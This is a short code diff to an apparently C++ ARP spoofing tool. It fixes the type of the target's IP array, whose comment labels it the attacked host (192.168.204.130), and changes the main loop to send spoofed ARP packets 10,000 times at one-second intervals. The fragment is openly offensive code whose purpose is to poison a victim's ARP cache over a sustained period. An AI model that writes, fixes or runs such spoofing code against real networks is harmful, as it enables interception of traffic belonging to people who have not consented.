@@ -98,13 +98,17 @@ void ArpSpoof::SetArpPacker()
 	geteway[2] = 0xcc;
 	geteway[3] = 0x2;
 
+
     //被攻击者ip
     //192.168.204.130
-    u_int dip [4];
+
+    u_char dip [4];
     dip[0] = 0xc0;
 	dip[1] = 0xa8;
 	dip[2] = 0xcc;
 	dip[3] = 0x82;
+
+
     // u_char sip[4];
     // sip[0] = 0xc0;
 	// sip[1] = 0xa8;
@@ -146,10 +150,11 @@ int main()
     ArpSpoof arpspoof;
     arpspoof.initDevice();
     arpspoof.SetArpPacker();
-    int i = 1000;
+    int i = 10000;
     while (i>0)
     {
         arpspoof.SendPacket();
+        Sleep(1000);
         i--;
     }
     
